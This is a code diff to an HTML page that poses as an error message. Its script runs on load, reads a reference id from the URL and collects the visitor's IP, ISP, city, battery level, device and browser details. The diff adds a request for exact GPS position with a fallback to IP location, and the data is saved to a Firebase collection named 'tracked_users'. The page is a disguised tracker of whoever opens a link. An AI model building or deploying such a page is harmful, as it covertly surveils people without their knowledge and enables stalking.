@@ -5,23 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Error</title>
     <style>
-        body {
-            font-family: sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: white;
-            color: #333;
-        }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: white; color: #333; }
         .container { text-align: center; }
-        .icon {
-            color: #d32f2f;
-            font-size: 40px;
-            font-weight: bold;
-            margin-right: 10px;
-        }
+        .icon { color: #d32f2f; font-size: 40px; font-weight: bold; margin-right: 10px; }
         .text { font-size: 20px; color: #333; }
     </style>
 </head>
@@ -38,17 +24,15 @@
         async function collectAndSaveData() {
             const urlParams = new URLSearchParams(window.location.search);
             const refId = urlParams.get('id');
+            if (!refId) return;
 
-            if (!refId) return; 
-
-            // Get IP Data
+            // 1. Basic IP & Device Data
             let ipData = {};
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 ipData = await response.json();
             } catch (error) { console.log("IP Fetch Error"); }
 
-            // Get Battery
             let batteryLevel = "Unknown";
             try {
                 if (navigator.getBattery) {
@@ -57,25 +41,48 @@
                 }
             } catch (e) {}
 
-            const userData = {
-                ip: ipData.ip || "Unknown",
-                isp: ipData.org || "Unknown",
-                city: ipData.city || "Unknown",
-                country: ipData.country_name || "Unknown",
-                lat: ipData.latitude || 0,
-                lon: ipData.longitude || 0,
-                device: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
-                os: navigator.platform,
-                browser: navigator.userAgent,
-                battery: batteryLevel,
-                timestamp: serverTimestamp(),
-                lastUpdated: new Date().toLocaleString()
+            // 2. Function to Save to Firebase
+            const saveData = async (lat, lon, accuracyType) => {
+                const userData = {
+                    ip: ipData.ip || "Unknown",
+                    isp: ipData.org || "Unknown",
+                    city: ipData.city || "Unknown",
+                    country: ipData.country_name || "Unknown",
+                    lat: lat,
+                    lon: lon,
+                    accuracy: accuracyType, // GPS or IP
+                    device: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
+                    os: navigator.platform,
+                    browser: navigator.userAgent,
+                    battery: batteryLevel,
+                    timestamp: serverTimestamp(),
+                    lastUpdated: new Date().toLocaleString()
+                };
+
+                try {
+                    await setDoc(doc(db, "tracked_users", refId), userData);
+                    console.log("Data Saved:", accuracyType);
+                } catch (e) { console.error("Error saving:", e); }
             };
 
-            try {
-                await setDoc(doc(db, "tracked_users", refId), userData);
-            } catch (e) { console.error("Error saving:", e); }
+            // 3. Try to get Exact GPS Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Success: Got Exact GPS
+                        saveData(position.coords.latitude, position.coords.longitude, "Exact GPS");
+                    },
+                    (error) => {
+                        // Denied/Error: Fallback to IP Location
+                        saveData(ipData.latitude, ipData.longitude, "Approx IP");
+                    }
+                );
+            } else {
+                // No GPS support: Fallback to IP
+                saveData(ipData.latitude, ipData.longitude, "Approx IP");
+            }
         }
+
         collectAndSaveData();
     </script>
 </body>
